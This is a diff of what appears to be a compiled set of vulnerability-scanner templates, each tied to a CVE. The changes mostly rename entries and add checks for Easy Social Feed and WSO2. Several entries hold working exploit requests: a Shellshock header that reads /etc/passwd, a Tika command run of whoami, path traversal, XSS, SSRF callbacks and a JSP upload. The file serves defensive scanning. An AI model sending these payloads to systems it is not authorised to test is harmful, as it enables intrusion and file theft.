@@ -3296,9 +3296,9 @@
       "requests": [
         {
           "headers": {
-            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
+            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -3617,7 +3617,7 @@
     {
       "id": "CVE-2015-2080",
       "info": {
-        "name": "Eclipse Jetty Remote Leakage",
+        "name": "Eclipse Jetty <9.2.9.v20150224 - Sensitive Information Leakage",
         "severity": "high"
       },
       "requests": [
@@ -4027,7 +4027,7 @@
     {
       "id": "CVE-2015-9480",
       "info": {
-        "name": "WordPress Plugin RobotCPA 5 - Directory Traversal",
+        "name": "WordPress RobotCPA 5 - Directory Traversal",
         "severity": "high"
       },
       "requests": [
@@ -4847,7 +4847,7 @@
     {
       "id": "CVE-2017-10271",
       "info": {
-        "name": "Oracle WebLogic Server Component Remote Command Execution",
+        "name": "Oracle Fusion Middleware WebLogic Server - Remote Command Execution",
         "severity": "high"
       },
       "requests": [
@@ -5363,7 +5363,7 @@
     {
       "id": "CVE-2017-3506",
       "info": {
-        "name": "Oracle Weblogic Remote OS Command Execution",
+        "name": "Oracle Fusion Middleware Weblogic Server - Remote OS Command Execution",
         "severity": "high"
       },
       "requests": [
@@ -5657,7 +5657,7 @@
     {
       "id": "CVE-2017-9805",
       "info": {
-        "name": "Apache Struts2 S2-052 RCE",
+        "name": "Apache Struts2 S2-052 - Remote Code Execution",
         "severity": "high"
       },
       "requests": [
@@ -6234,11 +6234,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
-            "Content-type": "image/jp2",
             "Connection": "close",
             "X-Tika-OCRTesseractPath": "cscript",
             "X-Tika-OCRLanguage": "//E:Jscript",
-            "Expect": "100-continue"
+            "Expect": "100-continue",
+            "Content-type": "image/jp2"
           },
           "method": "PUT",
           "path": [
@@ -6852,7 +6852,7 @@
     {
       "id": "CVE-2018-19365",
       "info": {
-        "name": "Wowza Streaming Engine Manager Directory Traversal",
+        "name": "Wowza Streaming Engine Manager 4.7.4.01 - Directory Traversal",
         "severity": "high"
       },
       "requests": [
@@ -7016,7 +7016,7 @@
     {
       "id": "CVE-2018-2791",
       "info": {
-        "name": "Oracle WebCenter Sites Cross-Site Scripting",
+        "name": "Oracle Fusion Middleware WebCenter Sites - Cross-Site Scripting",
         "severity": "high"
       },
       "requests": [
@@ -7078,7 +7078,7 @@
     {
       "id": "CVE-2018-3238",
       "info": {
-        "name": "Oracle WebCenter Sites 11.1.1.8.0 - Cross-Site Scripting",
+        "name": "Oracle Fusion Middleware WebCenter Sites 11.1.1.8.0 - Cross-Site Scripting",
         "severity": "high"
       },
       "requests": [
@@ -7315,7 +7315,7 @@
     {
       "id": "CVE-2018-7662",
       "info": {
-        "name": "CouchCMS Full Path Disclosure",
+        "name": "CouchCMS <= 2.0 - Full Path Disclosure",
         "severity": "medium"
       },
       "requests": [
@@ -8089,7 +8089,7 @@
     {
       "id": "CVE-2019-15713",
       "info": {
-        "name": "My Calendar <= 3.1.9 - Reflected Cross-Site Scripting (XSS)",
+        "name": "WordPress My Calendar <= 3.1.9 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -8149,7 +8149,7 @@
     {
       "id": "CVE-2019-16097",
       "info": {
-        "name": "Harbor Enables Privilege Escalation From Zero to admin",
+        "name": "Harbor <=1.82.0 - Privilege Escalation",
         "severity": "medium"
       },
       "requests": [
@@ -9044,7 +9044,7 @@
     {
       "id": "CVE-2019-7481",
       "info": {
-        "name": "sonicwall sra 4600 vpn pre-authenticated sql injection",
+        "name": "SonicWall SRA 4600 VPN - SQL Injection",
         "severity": "high"
       },
       "requests": [
@@ -9149,8 +9149,8 @@
         {
           "body": "url=https://{{Host}}:443@{{interactsh-url}}\n",
           "headers": {
-            "X-Atlassian-Token": "no-check",
-            "Content-Type": "application/x-www-form-urlencoded"
+            "Content-Type": "application/x-www-form-urlencoded",
+            "X-Atlassian-Token": "no-check"
           },
           "method": "POST",
           "path": [
@@ -9192,7 +9192,7 @@
     {
       "id": "CVE-2019-8982",
       "info": {
-        "name": "Wavemaker Studio 6.6 LFI/SSRF",
+        "name": "Wavemaker Studio 6.6 Local File Inclusion/Server-Side Request Forgery",
         "severity": "critical"
       },
       "requests": [
@@ -9390,7 +9390,7 @@
     {
       "id": "CVE-2020-10549",
       "info": {
-        "name": "rConfig 3.9.4 SQLi",
+        "name": "rConfig <=3.9.4 - SQL Injection",
         "severity": "critical"
       },
       "requests": [
@@ -9933,7 +9933,7 @@
     {
       "id": "CVE-2020-14883",
       "info": {
-        "name": "Oracle WebLogic Server Administration Console Remote Code Execution",
+        "name": "Oracle Fusion Middleware WebLogic Server Administration Console - Remote Code Execution",
         "severity": "high"
       },
       "requests": [
@@ -9980,7 +9980,7 @@
     {
       "id": "CVE-2020-15148",
       "info": {
-        "name": "Yii 2 (yiisoft/yii2) RCE",
+        "name": "Yii 2 <2.0.38 - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -10564,7 +10564,7 @@
     {
       "id": "CVE-2020-24186",
       "info": {
-        "name": "Unauthenticated File upload wpDiscuz WordPress plugin Remote Code Execution",
+        "name": "WordPress wpDiscuz <=7.0.4 - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -10830,9 +10830,9 @@
         {
           "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n",
           "headers": {
+            "content-type": "text/xml",
             "Cookie": "Login",
-            "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile",
-            "content-type": "text/xml"
+            "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile"
           },
           "method": "POST",
           "path": [
@@ -11843,7 +11843,7 @@
     {
       "id": "CVE-2020-7796",
       "info": {
-        "name": "Zimbra Collaboration Suite (ZCS) - SSRF",
+        "name": "Zimbra Collaboration Suite (ZCS) - Server-Side Request Forgery",
         "severity": "critical"
       },
       "requests": [
@@ -12290,7 +12290,7 @@
     {
       "id": "CVE-2020-9757",
       "info": {
-        "name": "SEOmatic < 3.3.0 Server-Side Template Injection",
+        "name": "Craft CMS < 3.3.0 - Server-Side Template Injection",
         "severity": "high"
       },
       "requests": [
@@ -13630,7 +13630,7 @@
     {
       "id": "CVE-2021-25074",
       "info": {
-        "name": "WebP Converter for Media < 4.0.3 - Unauthenticated Open redirect",
+        "name": "WordPress WebP Converter for Media < 4.0.3 - Unauthenticated Open Redirect",
         "severity": "medium"
       },
       "requests": [
@@ -13645,7 +13645,7 @@
     {
       "id": "CVE-2021-25112",
       "info": {
-        "name": "WHMCS Bridge < 6.4b - Authenticated Reflected XSS",
+        "name": "WordPress WHMCS Bridge < 6.4b -  Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -13653,6 +13653,21 @@
           "raw": [
             "POST /wp-login.php HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{RootURL}}\nContent-Type: application/x-www-form-urlencoded\nCookie: wordpress_test_cookie=WP%20Cookie%20check\n\nlog={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1\n",
             "GET /wp-admin/options-general.php?page=cc-ce-bridge-cp&error=%3Cimg%20src%20onerror=alert(document.domain)%3E HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-25120",
+      "info": {
+        "name": "Easy Social Feed < 6.2.7 - Cross-Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /wp-login.php HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{RootURL}}\nContent-Type: application/x-www-form-urlencoded\nCookie: wordpress_test_cookie=WP%20Cookie%20check\n\nlog={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1\n",
+            "GET /wp-admin/admin.php?page=easy-facebook-likebox&access_token=a&type=</script><script>alert(document.domain)</script> HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
@@ -14669,7 +14684,7 @@
     {
       "id": "CVE-2021-32682",
       "info": {
-        "name": "elFinder - Multiple vulnerabilities leading to RCE",
+        "name": "elFinder 2.1.58 - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -14855,7 +14870,7 @@
     {
       "id": "CVE-2021-3377",
       "info": {
-        "name": "Ansi_up XSS",
+        "name": "npm ansi_up v4 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -15512,7 +15527,7 @@
     {
       "id": "CVE-2021-40539",
       "info": {
-        "name": "Zoho ManageEngine ADSelfService Plus version 6113 Unauthenticated RCE",
+        "name": "Zoho ManageEngine ADSelfService Plus v6113 - Unauthenticated Remote Command Execution",
         "severity": "critical"
       },
       "requests": [
@@ -15634,7 +15649,7 @@
     {
       "id": "CVE-2021-40978",
       "info": {
-        "name": "MKdocs 1.2.2 Directory Traversal",
+        "name": "MKdocs 1.2.2 - Directory Traversal",
         "severity": "high"
       },
       "requests": [
@@ -16830,7 +16845,7 @@
     {
       "id": "CVE-2022-23881",
       "info": {
-        "name": "zzzphp v2.1.0 RCE",
+        "name": "ZZZCMS zzzphp 2.1.0 - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -17035,6 +17050,21 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/goforms/rlminfo"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-29464",
+      "info": {
+        "name": "WSO2 Management - Unrestricted Arbitrary File Upload & Remote Code Execution",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /fileupload/toolsAny HTTP/1.1\nHost: {{Hostname}}\nContent-Type: multipart/form-data; boundary=---------------------------250033711231076532771336998311\nContent-Length: 348\n\n-----------------------------250033711231076532771336998311\nContent-Disposition: form-data; name=\"../../../../repository/deployment/server/webapps/authenticationendpoint/{{to_lower(\"{{randstr}}\")}}.jsp\";filename=\"test.jsp\"\nContent-Type: application/octet-stream\n\n<% out.print(\"WSO2-RCE-CVE-2022-29464\"); %>\n-----------------------------250033711231076532771336998311--\n",
+            "GET /authenticationendpoint/{{to_lower(\"{{randstr}}\")}}.jsp HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
